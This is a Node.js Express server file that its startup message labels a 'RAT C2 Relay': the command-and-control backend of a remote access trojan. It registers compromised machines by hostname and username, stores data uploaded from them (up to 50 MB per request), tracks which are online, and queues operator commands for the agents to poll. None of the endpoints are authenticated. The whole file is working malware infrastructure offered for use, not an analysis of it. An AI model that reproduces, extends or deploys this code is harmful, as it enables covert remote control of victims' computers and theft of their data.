const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));

// In-memory storage
const agents = new Map();
const responses = new Map(); // agent_id -> [responses]
const commands = new Map();  // agent_id -> [{id, data, pending}]

// Health check
app.get('/', (req, res) => {
    res.json({ status: 'ok', agents: agents.size });
});

// Agent registration
app.post('/api/register', (req, res) => {
    const info = req.body;
    const id = info.id || uuidv4();

    // One entry per physical machine: drop any earlier session for the same
    // hostname + username so restarts don't pile up duplicates.
    for (const [existingId, agent] of agents.entries()) {
        if (existingId !== id &&
            agent.hostname === info.hostname &&
            agent.username === info.username) {
            agents.delete(existingId);
            responses.delete(existingId);
            commands.delete(existingId);
            console.log(`[PRUNE] removed stale session ${existingId} (${info.username}@${info.hostname})`);
        }
    }

    agents.set(id, { ...info, id, last_seen: new Date().toISOString() });
    console.log(`[REGISTER] ${info.username}@${info.hostname} (${id})`);
    res.json({ success: true, id });
});

// Agent sends data
app.post('/api/data/:agentId', (req, res) => {
    const { agentId } = req.params;
    const data = req.body;

    if (!responses.has(agentId)) {
        responses.set(agentId, []);
    }

    const agentResponses = responses.get(agentId);
    agentResponses.push({
        ...data,
        timestamp: new Date().toISOString()
    });

    // Keep last 100 responses per agent
    if (agentResponses.length > 100) {
        agentResponses.shift();
    }

    if (agents.has(agentId)) {
        agents.get(agentId).last_seen = new Date().toISOString();
    }

    console.log(`[DATA] ${data.type} from ${agentId}`);
    res.json({ success: true });
});

// Admin fetches data for an agent
app.get('/api/data/:agentId', (req, res) => {
    const { agentId } = req.params;
    const data = responses.get(agentId) || [];
    res.json(data);
});

// Admin fetches all agents (with computed status)
app.get('/api/agents', (req, res) => {
    const now = Date.now();
    const list = Array.from(agents.values()).map(agent => {
        const lastSeen = new Date(agent.last_seen).getTime();
        const ageSec = (now - lastSeen) / 1000;
        return {
            ...agent,
            status: ageSec < 30 ? 'Online' : 'Offline'
        };
    });
    res.json(list);
});

// Admin sends command to agent
app.post('/api/command/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmd = req.body;
    const cmdId = uuidv4();

    if (!commands.has(agentId)) {
        commands.set(agentId, []);
    }

    commands.get(agentId).push({
        id: cmdId,
        data: cmd,
        pending: true,
        timestamp: new Date().toISOString()
    });

    console.log(`[COMMAND] ${cmd.type} -> ${agentId} (${cmdId})`);
    res.json({ success: true, id: cmdId });
});

// Agent polls for commands (marks as delivered but doesn't delete)
app.get('/api/commands/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmds = commands.get(agentId) || [];

    // Return pending commands and mark them as delivered
    const pending = cmds.filter(c => c.pending);
    cmds.forEach(c => { c.pending = false; });

    res.json(pending.map(c => c.data));
});

// Command status check
app.get('/api/command-status/:agentId', (req, res) => {
    const { agentId } = req.params;
    const cmds = commands.get(agentId) || [];
    res.json(cmds.map(c => ({ id: c.id, type: c.data.type, pending: c.pending, timestamp: c.timestamp })));
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`RAT C2 Relay listening on port ${PORT}`);
});
